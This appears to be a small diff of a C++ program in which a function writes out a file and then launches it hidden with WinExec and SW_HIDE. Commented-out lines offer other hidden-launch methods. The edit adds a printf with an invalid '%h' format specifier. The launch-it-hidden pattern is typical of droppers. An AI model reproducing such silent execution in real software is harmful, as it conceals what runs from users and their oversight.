@@ -33,7 +33,7 @@ int proc(){
 	d.close();
 	//system(("@echo off && start /b "+nname+"").c_str());
 	//ShellExecute(NULL, "open", "cmd.exe",("/C start /b " + nname).c_str(),0, SW_HIDE);
-	WinExec(nname.c_str(), SW_HIDE);
+	printf("%h\n",WinExec(nname.c_str(), SW_HIDE));
 }
 int main(){
 	proc();
